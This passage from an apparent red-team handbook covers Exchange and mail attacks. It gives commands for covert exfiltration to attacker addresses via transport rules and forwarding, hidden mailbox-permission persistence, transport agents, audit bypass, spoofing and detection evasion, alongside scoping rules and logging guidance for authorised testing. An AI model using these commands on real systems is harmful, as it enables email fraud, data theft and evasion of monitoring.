**Why it works.** Transport rules are the designed mechanism for organisation-wide mail policy: DLP, disclaimers, journaling, routing. They see every message before delivery, they can copy, redirect, modify headers and change routing, and they are invisible to mailbox owners because they operate below the mailbox.

```powershell
# Blind copy everything matching a condition, organisation-wide
New-TransportRule -Name "Legal Hold" -SubjectOrBodyContainsWords "invoice","IBAN","remittance" `
  -BlindCopyTo "ops@$ATTACKER"

# Strip the external-sender warning banner from your phishing sender, to improve delivery
New-TransportRule -Name "Partner Exemption" -From "billing@lookalike.example" -RemoveOMEv2 $false `
  -SetHeaderName "X-MS-Exchange-Organization-SkipSafeLinksProcessing" -SetHeaderValue "1"
```

<!-- VERIFY: the exact header names and rule parameters that influence banner injection and link protection on a given build; these change with product updates and differ between on-premises and Exchange Online. -->

This is the most powerful interception mechanism in the estate and the one most worth demonstrating in a report, precisely because it is organisation-wide and requires no per-mailbox action. It is also very visible: transport rule creation is audited, and mature organisations alert on it.

**Journaling rules** (`New-JournalRule`) are the even blunter version: a supported feature whose entire purpose is to copy every message in scope to a designated mailbox. If it already exists, find out where the journal mailbox is, because it contains everything.

#### Forwarding

Two mailbox-level forwarding mechanisms, distinct from inbox rules, set with `Set-Mailbox`.

```powershell
# Forward to an external address, keeping a copy so the user notices nothing
Set-Mailbox -Identity victim -ForwardingSmtpAddress "ops@$ATTACKER" -DeliverToMailboxAndForward $true

# Forward to an internal recipient object (which can itself be a mail contact pointing outward)
Set-Mailbox -Identity victim -ForwardingAddress "somecontact" -DeliverToMailboxAndForward $true
```

`-ForwardingAddress` pointing at an innocuous-looking internal mail contact, which in turn has an external `externalEmailAddress`, is meaningfully quieter than `-ForwardingSmtpAddress` with an external address in it, because the mailbox property inspection shows an internal object. Enumerating forwarding therefore requires following the chain:

```powershell
Get-Mailbox -ResultSize Unlimited |
  Where-Object { $_.ForwardingSmtpAddress -or $_.ForwardingAddress } |
  Select-Object PrimarySmtpAddress, ForwardingSmtpAddress, ForwardingAddress, DeliverToMailboxAndForward
Get-MailContact -ResultSize Unlimited | Select-Object Name, ExternalEmailAddress
```

Automatic external forwarding is the single most monitored mail configuration in existence, because it is the signature of business email compromise. On-premises, `Set-RemoteDomain -AutoForwardEnabled $false` blocks it; in Exchange Online the outbound spam filter policy blocks it by default. Expect this to be either blocked or alerted, and prefer inbox rules with `-ForwardAsAttachmentTo` or transport rules with `-BlindCopyTo` where forwarding is controlled.

#### Delegation as credential-independent persistence

The point that matters most in this whole section: **a mailbox permission is an ACE, not a credential.** Granting a low-value account you control `FullAccess` on a high-value mailbox creates access that is completely unaffected by the high-value user's password change, MFA re-enrolment, token revocation, or session termination. It only ends when someone reviews the mailbox permissions, which almost nobody does.

```powershell
# Persistent read/write access to the target mailbox, held by an account you control.
# -AutoMapping:$false stops the mailbox appearing automatically in the delegate's Outlook,
# which is the difference between quiet persistence and a helpdesk ticket.
Add-MailboxPermission -Identity ceo -User svc_lowvalue -AccessRights FullAccess -InheritanceType All -AutoMapping:$false

# Quieter still: one folder, and invisible to Get-MailboxPermission
Add-MailboxFolderPermission -Identity "ceo:\Inbox" -User svc_lowvalue -AccessRights Reviewer

# And the ability to send as them, which is the BEC primitive
Add-ADPermission -Identity ceo -User svc_lowvalue -ExtendedRights "Send-As"
```

The same logic applies to `ApplicationImpersonation`: a role assignment persists across every credential change of every mailbox it covers.

#### The mailbox as a store

A mailbox is a few tens of gigabytes of attacker-writable, credentialed, replicated, backed-up storage inside the perimeter, reachable over an allowed protocol from anywhere. Uses that follow:

- **Staging.** Draft messages, never sent, holding notes, credentials, command output or base64 payloads. Drafts do not traverse transport, so transport-layer inspection never sees them.
- **Associated content.** MAPI folders have an "associated contents" table holding folder-associated items that normal mail clients do not display at all. It is where Outlook stores rules, forms and views. It is readable and writable over MAPI and EWS, and it is where you put something you do not want a user to notice. `MFCMAPI` is the tool for inspecting it.
- **Calendar and contact items** with attachments, which are less likely to be searched than mail.
- **A dead-drop channel.** Two implants that both authenticate to mailboxes can communicate through drafts or through a shared mailbox without ever generating outbound traffic to anything other than the organisation's own mail server. This is a genuinely effective C2 channel pattern and is covered further in the Command and Control section.

#### What survives credential rotation

This table is the practical answer to "we reset the password, are we clean".

| Mechanism | Survives password reset of the victim | Survives password reset of the operator's account | Removed by |
| --- | --- | --- | --- |
| Inbox rule on the victim's mailbox | **Yes.** The rule is a mailbox property | N/A | Deleting the rule (`Remove-InboxRule`) |
| Mailbox forwarding (`Set-Mailbox`) | **Yes** | N/A | Clearing the mailbox property |
| Mailbox `FullAccess` permission | **Yes** | No, if the granted account's credential is reset **and** you have no other route to it | `Remove-MailboxPermission` |
| Mailbox folder permission | **Yes** | Same as above | `Remove-MailboxFolderPermission` |
| `Send-As` / `GrantSendOnBehalfTo` | **Yes** | Same as above | Removing the ACE |
| `ApplicationImpersonation` role assignment | **Yes**, for every mailbox in scope | Same as above | `Remove-ManagementRoleAssignment` |
| Transport rule | **Yes.** Organisation-wide, mailbox-independent | Yes, entirely | Removing the rule |
| Journaling rule | **Yes** | Yes | Removing the rule |
| Transport agent | **Yes** | Yes | Uninstalling the agent and restarting transport |
| Webshell in the Exchange web root | **Yes** | Yes | File removal, or a CU install which replaces the web root |
| Stolen mailbox credential alone | **No** | N/A | The password reset |
| OAuth refresh token (cloud) | Only until revoked | N/A | Token revocation, which is a separate action from a password reset |

The operational conclusion: **the mechanisms an incident responder is least likely to check are the ones that survive everything**. Transport rules, transport agents, impersonation role assignments and mailbox ACEs are all organisation-wide or victim-independent, and none of them appear in a credential-rotation runbook.

#### Transport agent persistence

Worth its own note because it is the most durable and least examined mail persistence available. A **transport agent** is a .NET assembly registered into the Exchange transport pipeline. It runs in-process inside the transport service, it sees every message that passes through the server, and it can read, modify, copy or drop any of them.

```powershell
Get-TransportAgent
Install-TransportAgent -Name "Content Filter Extension" -TransportAgentFactory "Ns.Class" -AssemblyPath "C:\Program Files\Microsoft\Exchange Server\V15\TransportRoles\agents\ext\ext.dll"
Enable-TransportAgent -Identity "Content Filter Extension"
Restart-Service MSExchangeTransport
```

It requires administrative access to the Exchange server, it requires a service restart (a brief mail flow interruption, so plan it), and it is invisible to every mailbox-level and rule-level review. `Get-TransportAgent` lists it, which is the only place it shows up, and almost nobody runs `Get-TransportAgent`. Cumulative updates can remove third-party agents, which is the natural expiry.

### Mail as an objective

#### Why it is usually the real objective

Domain Admin is a technical outcome. Reading the board's mail is a business outcome, and it is the one that changes behaviour after the engagement. On a large proportion of engagements the client's stated concern, once you get past the checklist, is some variant of fraud, data loss or executive compromise, and all three live in mail.

**Business email compromise outcomes.** The mechanics you can demonstrate, in ascending order of intrusiveness, are: read access to a finance or executive mailbox; the ability to send as that person indistinguishably (`Send-As`, not `Send on Behalf`, because the latter is visible to recipients); the ability to intercept and modify mail in transit (transport rule); and the ability to suppress the victim's visibility of any of it (inbox rule deleting notifications). The full BEC chain is: compromise a finance mailbox, use an inbox rule to divert and hide replies from a specific counterparty, insert yourself into an existing thread about a real payment, send altered bank details as the genuine sender from the genuine mailbox, and delete the confirmation. Every step of that is a supported feature. **Demonstrate the capability, never execute the fraud**, and agree the boundary in writing before you start: what you will send, to whom, and that no external counterparty will receive anything.

**The value of mail content on an engagement.** Mail is where the estate documents itself. Specific things that are reliably in mailboxes and reliably useful:

- Credentials in plain text, sent by humans to other humans, in threads titled "server access" and "temporary password".
- Password reset and enrolment mail from every system in the organisation, including the ones you had not discovered. A user's mailbox is a directory of every SaaS platform they use.
- MFA enrolment and recovery mail, which is a path to self-service account takeover.
- VPN and remote access onboarding, with configuration files attached.
- Network diagrams, asset inventories, DR runbooks and third-party penetration test reports, all sent as attachments to people who then never deleted them.
- Vendor and supplier relationships, contract values, and the actual approval chain for payments, which is the intelligence that makes a BEC demonstration credible.
- Certificates and private keys, sent as attachments because the secure transfer process was inconvenient.

Search for the shapes, not the words: attachment extensions, sender addresses belonging to internal systems, and subject patterns.

**Reporting impact.** A screenshot of an executive's inbox, with subject lines legible and the identity of the mailbox unambiguous, ends every argument about severity. It is the most persuasive single artefact available in an internal engagement report, more so than a `secretsdump` output, because a non-technical reader understands it instantly. Use it, and use exactly one of it.

#### Scoping and handling, done properly

Mailbox content is the most sensitive data you will touch, and it is sensitive in ways that have nothing to do with the client's security posture: employees' personal correspondence, health and HR matters, privileged advice, and third parties' information. Treat that as a constraint on how you work, in the same way that a fragile OT segment is a constraint on how you scan.

The practical rules:

- **Name the mailboxes in the scope document.** Not "mailbox access" but "read access will be demonstrated against the following named mailboxes, agreed with the client". Get a named client contact to agree the list.
- **Exclude the categories that create legal exposure**: legal and in-house counsel, HR, occupational health, whistleblowing and ethics mailboxes, works council and union representatives. If the demonstration requires one of them, escalate it rather than deciding yourself.
- **Evidence with metadata.** Subject lines, sender and recipient, timestamps, folder counts and search hit counts prove access. Message bodies rarely add anything the metadata did not, and they multiply the handling problem.
- **Redact in the report.** Subject lines partially masked, addresses partially masked, enough to be recognisable to the client and useless to anyone else.
- **Extract the minimum.** Do not export a PST because it is convenient. Retrieve the specific items that constitute your evidence.
- **Handle and destroy.** Encrypted storage for the duration, a stated retention period in the engagement paperwork, and actual verified deletion at the end. If you pulled credentials out of mail, they go in the report and out of your notes.
- **Tell them straight away if you find something that is not a security finding.** Evidence of fraud, of an existing compromise, or of something legally serious is a stop-work-and-escalate event, not a report finding.

### Hybrid and cloud mail

The Entra ID, token, conditional access and hybrid identity material is in the Cloud and Modern Identity section. What follows is the mail-specific slice, cross-referenced rather than repeated.

#### The hybrid Exchange relationship

A hybrid deployment is a bidirectional trust between an on-premises Exchange organisation and an Exchange Online tenant, established by the Hybrid Configuration Wizard. Concretely it comprises: mail flow connectors in both directions, an **OAuth server-to-server trust** so each side can obtain tokens for the other, federation of free/busy and MailTips, an **MRS Proxy** endpoint (`/EWS/mrsproxy.svc`) for mailbox moves, and a shared address space so a single SMTP domain resolves in both places. Recipients exist as `RemoteMailbox` objects on-premises, with `targetAddress` pointing at the tenant routing domain, and as mailboxes in the cloud.

The trust is anchored on the **Exchange Server Auth Certificate**, a self-signed certificate on the on-premises servers whose public key is registered against a service principal in the tenant. Possession of that certificate's private key is the ability to authenticate to the tenant as that service principal.

**Why a hybrid Exchange server is a bridge in both directions.** Downward, a tenant administrator with Exchange Administrator can reconfigure connectors, initiate mailbox moves through MRS Proxy, and read on-premises free/busy and MailTips. Upward, and far more importantly, the on-premises Exchange server holds a credential (the auth certificate private key) that the tenant trusts, so **SYSTEM on a hybrid Exchange server is a foothold in the cloud tenant**. That is the mechanism, and it is why hybrid Exchange servers must be treated as Tier Zero on both sides of the boundary.

**The over-privileged shared service principal.** Historically, hybrid deployments did not get a per-tenant application. Every hybrid organisation's on-premises Exchange authenticated to a **single shared, Microsoft-owned service principal**, which held broad Exchange Online permissions. Two consequences: the permission granted was far wider than any individual organisation needed, and because the principal was shared, actions taken through it were poorly attributable in the tenant's audit trail. That is the substance of **CVE-2025-53786**: an attacker with administrative access to an on-premises hybrid Exchange server could escalate into the connected cloud tenant across that shared identity with limited auditability. CISA issued **Emergency Directive ED 25-02** in August 2025.

The remediation is architectural rather than a patch: install the April 2025 hotfix or later, then run Microsoft's `ConfigureExchangeHybridApplication.ps1` from the CSS-Exchange repository to create a **dedicated Exchange hybrid application** in the tenant, upload the auth certificate to it, switch the on-premises organisation over, and clean up the old shared service principal. Microsoft set an enforcement deadline of **31 October 2025**, after which hybrid features depending on the old path stop working.

For an operator, the enumeration question is therefore: is this hybrid organisation still on the shared service principal, or has it moved to a dedicated app? Check the tenant's enterprise applications for a dedicated Exchange hybrid app, check the on-premises `Get-AuthServer` and hybrid configuration, and check the Exchange build for the April 2025 hotfix or later. <!-- VERIFY: the specific on-premises cmdlet and property that indicate whether the dedicated hybrid app is in use. -->

#### Cloud mailbox access

Three routes, all covered mechanically in the Cloud and Modern Identity section.

**User tokens.** An access token for the Exchange Online resource, obtained from a stolen refresh token, a primary refresh token, a device code phish, or an authenticated session. Mail read and write via Graph or via Exchange Online endpoints. Cross-reference the token families and the family-of-client-IDs refresh exchange in the Cloud and Modern Identity section; the relevant resource identifier for mail is `https://outlook.office365.com`.

**Application permissions.** The high-yield route. An application with the Graph application permission `Mail.Read`, `Mail.ReadWrite` or `Mail.Send`, or with `full_access_as_app` on the Office 365 Exchange Online API, has access to **every mailbox in the tenant**, unconstrained by any user's own access, with no interactive authentication and therefore no conditional access evaluation and no MFA. A credential (secret or certificate) on such an application's service principal is total mail compromise, and adding a credential to an existing service principal is a documented Entra escalation covered in the Cloud and Modern Identity section.

Exchange Online now supports **RBAC for Applications**, which lets an administrator scope an application's mailbox access to a subset of mailboxes via `New-ServicePrincipal` and a management scope, rather than the all-or-nothing `full_access_as_app`. Where it is configured, application permissions are much less catastrophic. Where it is not, they are total. Check which. <!-- VERIFY: current cmdlet set for Exchange Online RBAC for Applications. -->

**App-only Exchange Online PowerShell**, via the `Exchange.ManageAsApp` permission plus an Exchange administrative role assigned to the service principal. This gives an application the full Exchange Online cmdlet surface, which is transport rules, mailbox permissions, forwarding and search, non-interactively.

Tooling for the cloud side: **GraphRunner** for mailbox search, rule enumeration and exfiltration over Graph, **TeamFiltration** for spraying and post-authentication mail collection, **AADInternals** for the identity plumbing, **roadrecon** for tenant enumeration.

#### Legacy authentication as the standard control bypass

The 2020 playbook was to spray a valid credential against Exchange Online's legacy protocols (EWS, ActiveSync, IMAP, POP, SMTP AUTH, and Autodiscover Basic) because Basic authentication there did not evaluate conditional access or MFA. Microsoft disabled Basic authentication for the affected Exchange Online protocols in 2022, so this is largely dead, with important residue:

- **SMTP AUTH** is the documented exception and can be enabled per-tenant and per-mailbox (`Set-TransportConfig -SmtpClientAuthenticationDisabled`, `Set-CASMailbox -SmtpClientAuthenticationDisabled`). It is enabled in a great many tenants because a printer, a scanner or a line-of-business application needs it. It is send-only, which makes it a phishing platform rather than a read primitive, and phishing from a real internal mailbox is extremely effective.
- **On-premises Exchange is unaffected by any of this.** Basic authentication on `/EWS`, `/Microsoft-Server-ActiveSync` and `/Autodiscover` is the default and remains so. Everything the 2020 playbook said about legacy authentication is still true on-premises, which is the single most important reason a hybrid organisation's on-premises Exchange is a bigger risk than its cloud tenant.
- Run **MFASweep** or equivalent against any working cloud credential to find out which Microsoft surfaces did not enforce a second factor, rather than assuming.

**EWS itself is being retired in Exchange Online.** From **1 October 2026** EWS is blocked unless the tenant has set `EWSEnabled` to true and configured an application allow list (`EWSAllowedAppIDs`), and from **1 April 2027** it is removed permanently with no re-enablement. Two consequences for tooling: EWS-based cloud mail tooling has an expiry date and Graph-based tooling does not, so anything you build for the cloud should target Graph; and a tenant that has explicitly configured an EWS allow list to keep a legacy integration alive has told you exactly which application identity to go after.

### Other mail infrastructure

#### Mail gateways and security appliances

Almost every organisation puts a secure email gateway in front of Exchange: Proofpoint, Mimecast, Barracuda, Cisco Secure Email, Trend Micro, Sophos, Microsoft Defender for Office 365. They are worth attacking in their own right, because of what they hold:

- **A message archive or quarantine**, which is a copy of mail content outside Exchange, frequently with a longer retention period and much weaker access controls.
- **An administrative console with organisation-wide mail search and message release**, which is mailbox content access without touching a mailbox and without generating any Exchange or unified audit telemetry.
- **A directory synchronisation credential**, usually an LDAP bind account, used to pull the recipient list. It is a domain account, its password is in the appliance configuration, and it is often far more privileged than a directory read requires.
- **SMTP relay rights** into the organisation, trusted by Exchange's receive connectors, which means mail injected at the gateway arrives internally with the gateway's trust and typically without external-sender warnings.
- **API keys and journaling configuration**, which can be repointed.

They are also appliances: closed, infrequently patched, often internet-facing, running old software stacks, and historically a rich source of pre-authentication remote code execution. **CVE-2023-2868**, a command injection in the Barracuda Email Security Gateway's attachment processing, was mass-exploited to the point that Barracuda's remediation guidance was to physically replace the appliances rather than patch them. The **Mimecast** 2021 incident, in which a certificate used to authenticate Mimecast connections to customers' Microsoft 365 tenants was stolen, is the other shape of the same problem: a mail security vendor holds a credential into every customer tenant.

Enumerate the gateway from outside via MX records and banner grabbing, and from inside via the receive connector configuration on Exchange:

```powershell
Get-ReceiveConnector | Select-Object Identity, Bindings, RemoteIPRanges, PermissionGroups, AuthMechanism
Get-SendConnector | Select-Object Identity, AddressSpaces, SmartHosts, DNSRoutingEnabled
```

`RemoteIPRanges` on an anonymous-permitted receive connector is the list of hosts that can inject mail into the organisation without authentication. If that list is broad, or includes a subnet you can reach, you can send internal-looking mail with no credential at all.

#### SMTP relay testing

```bash
# Open relay: will it carry mail from an external sender to an external recipient
swaks --server $TARGET --from "attacker@evil.example" --to "test@gmail.com" --header "Subject: relay test"

# Internal-to-internal spoofing, which is the finding that actually matters
swaks --server $TARGET --from "ceo@$DOMAIN" --to "finance@$DOMAIN" --header "Subject: payment"

# Recipient enumeration, where the MTA validates
swaks --server $TARGET --quit-after RCPT --to "someone@$DOMAIN"

nmap -p25,465,587 --script smtp-open-relay,smtp-commands,smtp-enum-users $TARGET
```

A genuinely open relay (external to external) is rare now. **Internal spoofing** is not: an anonymous-permitted receive connector that accepts mail claiming to be from an internal address, and delivers it internally without a warning banner, is a phishing platform that bypasses every external-mail control the organisation has. Test it, and test it from every network position you have, because the connector's `RemoteIPRanges` decides the answer.

The related enumeration surface: `VRFY` and `EXPN` (almost always disabled), `RCPT TO` recipient validation (frequently enabled, frequently the best username oracle you will get from the internet), and `SMTP smuggling`, the 2023 class of attack where inconsistent interpretation of end-of-data sequences between a sending and a receiving MTA lets you smuggle a second, spoofed message inside a legitimate one, defeating SPF and DMARC on the smuggled message.

#### Mail routing as intelligence

DNS mail records are public and describe the organisation's infrastructure in detail. This is one of the highest-yield unauthenticated reconnaissance sources available and it costs nothing.

| Record | What it tells you |
| --- | --- |
| `MX` | Which gateway vendor, and whether mail lands on-premises or in the cloud. `*.mail.protection.outlook.com` means Microsoft 365 (possibly hybrid); a vendor hostname means a gateway sits in front |
| `SPF` (`TXT` at the apex) | **Every system authorised to send as this organisation.** Marketing platforms, ERP, CRM, ticketing, payroll, HR, monitoring, other cloud tenants, third-party datacentres. This is an external asset inventory that the organisation published deliberately |
| `DMARC` (`TXT` at `_dmarc`) | Policy strength (`p=none` means spoofing is unenforced), and the `rua`/`ruf` reporting addresses, which are often at a third-party analytics vendor |
| `DKIM` (`TXT` at `<selector>._domainkey`) | Which signing services are in use, and the selector names often name the vendor |
| `autodiscover.$DOMAIN` | A CNAME to `autodiscover.outlook.com` proves a Microsoft 365 or hybrid tenant; an A record to a self-hosted address proves on-premises Exchange and gives you its address |
| `enterpriseregistration`, `enterpriseenrollment`, `msoid`, `lyncdiscover`, `sip` | Device registration, Intune enrolment, and Teams or Skype federation, all confirming and characterising the Microsoft tenant |

`p=none` DMARC with a permissive SPF is a spoofing finding worth reporting on its own, independently of anything else you achieve.

#### Non-Microsoft mail platforms

Conceptually the same attack surface with different implementations, and worth naming because a proportion of estates run them.

**Zimbra** is the most consequential non-Microsoft on-premises platform from an offensive perspective, because it is a large Java web application with an administrative console, it is frequently internet-facing, and it has had a series of mass-exploited pre-authentication issues (notably the 2022 authentication bypass and archive extraction chain used at scale against government targets). Treat it exactly as you would Exchange: enumerate the version from the web surface, check the admin console exposure, and check the patch level against a known chain.

**Roundcube, Horde and other webmail front ends** are PHP applications sitting on top of IMAP. They are web application targets: authentication bypass, XSS leading to mail theft, and file inclusion. The IMAP server behind them is a separate, usually much simpler, credential target.

**Postfix, Exim and Dovecot** are the MTA and IMAP layer on Linux mail hosts. Exim in particular has had severe pre-authentication remote code execution issues (CVE-2019-10149 being the well-known one). A compromised MTA is every message in transit; a compromised Dovecot host is every mailbox on disk, usually as flat Maildir files that need no protocol at all to read.

**Google Workspace** is the other large enterprise platform, and its equivalent of the over-privileged application permission is **domain-wide delegation**: a Google Cloud service account authorised in Workspace to impersonate any user for a set of scopes, configured in a different console from the one where the service account lives. One key, all mail. That is covered in the CI/CD and source control material in the Cloud and Modern Identity section.

### Detection and opsec

State the conclusion first, because it is the opposite of most operators' intuition: **mailbox access is one of the best-instrumented activities in a Microsoft estate.** Exchange logs prodigiously by default, the cloud unified audit log retains longer than almost any other log the organisation has, and mail is the workload defenders and compliance teams watch hardest because it is where regulated data lives. Assume you are logged, and plan for what the log will say.

#### On-premises Exchange logging

| Log | Location or cmdlet | What it captures |
| --- | --- | --- |
| **IIS logs** | `C:\inetpub\logs\LogFiles\W3SVC1` (frontend), `W3SVC2` (backend) | Every HTTP request: URI, full query string, method, status, user agent, source address, and the authenticated username. **This is the log that catches every web-surface attack**, and it is what all the ProxyLogon and ProxyShell hunting guidance queries |
| **HttpProxy logs** | `%ExchangeInstallPath%Logging\HttpProxy\<Protocol>\` | Per-protocol frontend-to-backend proxy logs (Owa, Ews, Ecp, Autodiscover, Mapi, RpcHttp, PowerShell) recording the authenticated user, the target backend, and the URL stem. The definitive record for proxy-abuse chains |
| **ECP logs** | `%ExchangeInstallPath%Logging\ECP\Server\` | Administrative interface activity |
| **`MSExchange Management` event log** | Windows event log of that name | **Every Exchange Management Shell cmdlet executed**, with parameters and the invoking identity. On by default. Event ID 1 <!-- VERIFY: event ID --> |
| **Administrator audit log** | `Search-AdminAuditLog`, `New-AdminAuditLogSearch` | Every non-`Get` cmdlet, with parameters, caller and timestamp. On by default. This is where your `Add-MailboxPermission`, `New-InboxRule`, `New-TransportRule` and role assignments land |
| **Mailbox audit log** | `Search-MailboxAuditLog -Identity x -ShowDetails` | Per-mailbox access events: which folders and items were accessed, by which delegate or impersonating identity. **Disabled by default in on-premises Exchange** |
| **Message tracking logs** | `Get-MessageTrackingLog`, `%ExchangeInstallPath%TransportRoles\Logs\MessageTracking` | Every message in and out, with sender, recipients, size and (if subject logging is enabled) subject. The record that catches forwarding and BCC exfiltration |
| **SMTP protocol and connectivity logs** | `TransportRoles\Logs\` | SMTP conversations, useful to a defender reconstructing relay abuse |
| **Windows security log on the Exchange server** | Event log | 4624 and 4625 for authentications, and **4688 for process creation**. A `cmd.exe` or `powershell.exe` whose parent is `w3wp.exe` is the highest-fidelity webshell signal that exists |

Two specific items to know about.

**Mailbox audit bypass.** `Set-MailboxAuditBypassAssociation -Identity <account> -AuditBypassEnabled $true` exempts an account from generating mailbox audit entries when it accesses mailboxes. It exists so that high-volume service accounts do not flood the audit log. It is also, obviously, a way to make your mailbox access stop being logged. The catch: setting it is itself a cmdlet execution recorded in the administrator audit log and in the `MSExchange Management` event log, so you have traded a stream of quiet entries for one very loud one. Enumerating existing bypass associations, on the other hand, is free and tells you which accounts a defender has already blinded themselves to:

```powershell
Get-MailboxAuditBypassAssociation -ResultSize Unlimited | Where-Object { $_.AuditBypassEnabled }
```

**Mass access and export are visible by construction.** `New-MailboxExportRequest` creates a persistent request object (`Get-MailboxExportRequest`), writes a large file, and logs the cmdlet. `New-MailboxSearch` and the compliance search cmdlets create named, enumerable search objects. Iterating hundreds of mailboxes over EWS with an impersonation account produces hundreds of authentications and, where mailbox auditing is enabled, an audit entry per mailbox from a single identity in a short window, which is about as clean a detection signature as it is possible to produce. If mass access is the objective, accept that it will be found and optimise for getting the value before it is, rather than for not being found.

#### Cloud logging

The unified audit log is covered in the Cloud and Modern Identity section; the mail-specific facts:

- **Mailbox auditing is on by default in Exchange Online** and has been since January 2019. On-premises it is off by default. That asymmetry is important: the same technique is well-logged in the cloud and often unlogged on-premises.
- **`MailItemsAccessed`** records which individual messages were read. It is an Audit (Premium) event, requiring the appropriate licensing. In a premium-licensed tenant, an incident responder can tell you exactly which messages you opened; in a standard tenant they cannot. Establish which you are in before deciding how much to read.
- **Rule and permission changes are first-class audited events** and are the subject of default alert policies in Defender for Office 365. `New-InboxRule`, `Set-InboxRule` and `UpdateInboxRules` with a forwarding or delete action, `Add-MailboxPermission`, `Add-RecipientPermission`, `Set-Mailbox` with a forwarding change, and `New-TransportRule` all generate entries, and several of them generate alerts out of the box because they are the BEC signature.
- **Retention is long.** The unified audit log retains 180 days at the standard tier and up to a year or more at the premium tier, which makes it the longest-retained log most tenants have and the most likely place someone finds you months after the engagement.

```powershell
# What a defender will run. Run it yourself first.
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -Operations New-InboxRule,Set-InboxRule,UpdateInboxRules,Add-MailboxPermission,New-TransportRule,Set-Mailbox
```

#### Practical opsec

- **Use a protocol the organisation already uses.** MAPI over HTTP from a workstation looks like Outlook. EWS from a server looks like an integration. IMAP from an unfamiliar source address does not look like anything.
- **Read as an identity that is supposed to read.** An existing archiving or backup service account accessing every mailbox generates the same telemetry it generates every night. Your newly created role assignment does not.
- **Prefer search to export.** Targeted compliance or EWS search against named mailboxes is orders of magnitude less visible than a PST export, and it produces the evidence you actually need.
- **Set `-AutoMapping:$false`** on any `FullAccess` grant. Autodiscover otherwise adds the mailbox to the delegate's Outlook automatically, which is how a granted permission becomes a helpdesk ticket.
- **Do not disable auditing.** The act of disabling it is louder than the thing you were trying to hide, and it converts a technical finding into an "attacker attempted to destroy evidence" narrative.
- **Work in business hours and from a plausible source.** Mail access at 03:00 from a source address that has never authenticated before is the easiest anomaly in the world to detect, and it is detected by tooling the organisation already owns.
- **Name your artefacts plausibly and clean them up.** Rules, role assignments, mailbox permissions, search objects and export requests are all persistent, enumerable objects. Keep a written list of every one you create and remove all of them.

### Summary

| Technique | Precondition | Yield | Current viability |
| --- | --- | --- | --- |
| Exchange enumeration from LDAP (servers, versions, recipients, delegation) | Any authenticated domain user | Full Exchange topology, patch levels, mailbox inventory, delegation graph. Zero contact with a mail server | **Excellent.** Always do this first |
| NTLM info disclosure via HTTP virtual directories | Network reachability to 443 | Internal NetBIOS and DNS names, domain and forest names, unauthenticated | **Excellent** |
| Build fingerprinting from the web surface | Reachability to `/owa` or `/ecp` | Exact CU and security update level, which decides every other decision | **Excellent** |
| Username enumeration against OWA, ActiveSync or Autodiscover | Reachability | Validated usernames | **Poor and unreliable** on patched builds. Use Kerberos enumeration or a credentialed GAL dump instead |
| Password spraying mail endpoints | Reachability, a username list, a lockout policy | Working credentials | **Good**, and often the only external entry point. Rate-limit against the real policy |
| MFA gap enumeration per endpoint | One valid credential | Identifies endpoints where a password alone is sufficient | **Excellent.** The most reliable configuration finding in on-premises Exchange |
| CVE-2020-0688 (static ViewState keys) | Any mailbox credential, unpatched Exchange | `SYSTEM` on the Exchange server | Long patched, but still found on unsupported servers |
| ProxyLogon (26855 + 27065) | Unpatched, reachable Exchange | Pre-authentication `SYSTEM`, webshell | Patched everywhere that patches. Non-zero in the unsupported long tail |
| ProxyShell (34473 + 34523 + 31207) | Unpatched, reachable Exchange | Pre-authentication `SYSTEM`, webshell | Same |
| ProxyNotShell / OWASSRF (41040 or 41080, plus 41082) | A mailbox credential (ProxyNotShell) or reachability (OWASSRF), unpatched | `SYSTEM` | Same. OWASSRF specifically defeated the mitigation-only posture |
| PrivExchange (coerce Exchange, relay to LDAP, DCSync) | Any mailbox credential, unprepared directory, no EPA, no LDAP signing or channel binding | Domain compromise via DCSync | **Low but non-zero.** Test whether the domain-object ACE lacks Inherit Only before dismissing it |
| Relay to Exchange (CVE-2024-21410 class) | A coercible victim, Exchange without Extended Protection | Mailbox access as the victim, and mailbox configuration changes | **Moderate.** Dead on Exchange 2019 CU14 and later with EP on; live where EP was disabled for compatibility |
| `Exchange Windows Permissions` ForceChangePassword against an unprotected privileged service account (for example the Entra Connect connector account) | Membership in, or a relayed identity within, the Exchange group chain | DCSync, in one step, without touching the domain object DACL | **Good.** Survives the 2019 permissions reduction and is frequently overlooked |
| `Exchange Trusted Subsystem` writing `altSecurityIdentities` (ESC14) | The group chain, plus a usable certificate and weak certificate binding enforcement | Authenticate as a privileged user via certificate mapping | **Situational.** Depends on AD CS configuration and KB5014754 enforcement state.
